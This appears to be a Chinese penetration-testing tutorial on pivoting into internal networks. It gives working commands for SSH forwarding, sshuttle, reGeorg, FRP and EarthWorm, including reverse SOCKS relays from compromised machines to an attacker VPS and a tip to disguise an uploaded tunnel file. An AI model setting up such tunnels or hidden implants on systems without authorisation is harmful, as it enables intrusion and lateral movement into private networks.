在项目中总会遇到一些不出网的机器，或者有些跑在 127.0.0.1 上的服务。这时候就需要把端口或者网断代理出来进行下一步操作。

0x01 ssh

本地转发 

ssh -NL 本地端口:目标IP:目标端口 跳板user@跳板机IP
ssh -NL 13306:127.0.0.1:3306 root@10.10.10.1

访问本机的13306 就是访问10.10.10.1机器 127.0.0.1:3306 端口

远程转发 

ssh -NR 端口:目标IP:目标端口 跳板机用户名@跳板机IP
ssh -NR 8899:10.10.10.1:3306 root@10.10.10.2

访问10.10.10.2的 8899 端口就相当于访问 10.10.10.1的3306端口

动态转发 

ssh -ND 本地端口 跳板机用户名@跳板机ip
ssh -ND 2000 root@10.10.10.1

就相当于burp的代理浏览器设置好之后，所有的流量都被先代理到10.10.10.1这台机器，在到你所访问的目标

ssh 代理一般常用于链接目标开在 127.0.0.1 上的数据库或者站库分离的使用，php 站的话可以使用 adminer.php 来操作数据库，但是库比较大的话还是还是把端口代理出来使用 Navicat 操作。

0x02 sshuttle

sshuttle -vr root@10.10.10.10.1 192.168.1.0/24 --ssh-cmd "ssh -i id_rsa"

#sshuttle 会在本地做路由你访问 192.168.1.0/24 的流量会被代理到10.10.10.1机器上

当拿下边界 web 服务器时可以用这个工具代理流量去访问内网的机器。

限制：你必须有本机的 root 权限但是你可以在服务端有普通账户即可。服务器要支持 python2.3 或者更高版本。

github 链接

https://github.com/apenwarr/sshuttle

0x03 reGeorg

reGeorg 用于前后端分离的站

reGeorg 是用 python 写的，利用 Web 进行代理的 http 隧道工具。

上传对应版本的tunnel到服务器上，访问目标站点的tunnel文件

python reGeorgSocksProxy.py -p 5555 -u http://目标站点/tunnel.php  
//自己做一下隐藏吧，这名字和内容太明显了。。。。。。。。

自己本地代理到5555端口上就能访问目标的内网了

0x04 FRP

frp 用来做内网穿透使用，必须自己拥有一台公网的服务器。

github 地址：

https://github.com/fatedier/frp/releases

客户端：frpc.ini

[common] 
server_addr = 10.10.10.1   //服务器ip
server_port = 7000     //链接vps服务器的端口

[ssh]
type = tcp     //制定类型
local_ip = 127.0.0.1  //暴露本地ip
local_port = 22   //暴露本地端口
remote_port = 6000   // 攻击者链接的端口

服务端 frps.ini

[common]
bind_port = 7000   客服端链接的端口

避坑：阿里云，腾讯云这种服务器厂商，需要在 官方的防火墙里面吧对应的端口打开，否则无法使用。

0x05 EW

EarthWorm 是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。专有主页：http://rootkiter.com/EarthWorm/

普通内网环境：

1、目标有公网 ip 且拥有权限。

./ew -s ssocksd -l 8888  

访问8888

2、目标无公网 ip

./ew -s rcsocks -l 1080 -e 8888  //vps运行
./ew -s rssocks -d 1.1.1.1 -e 8888 //边界机器
访问vps的1080 端口

二重内网环境：

1、A有公网ip（边界机器 dmz 区） B内部机器（数据区可以链接 A 但不出网）

./ew -s ssocksd -l 9999    //B机器运行
./ew -s lcx_tran -l 1080 -f 2.2.2.3（B机器的ip） -g 9999  //A机器运行


访问 A的 1080端口

2、A 无公网 ip 可出网 ，B 可访问 A 但不出网

./ew -s lcx_listen -l 1080 -e 8888 //vps运行
./ew -s ssocksd -l 9999					// B机器运行
./ew -s lcx_slave -d 1.1.1.1（vpsip） -e 8888 -f 2.2.2.3 -g 9999  //A机器运行

访问vps 的1080

注：考虑到该工具影响很坏，该工具永久停止更新。
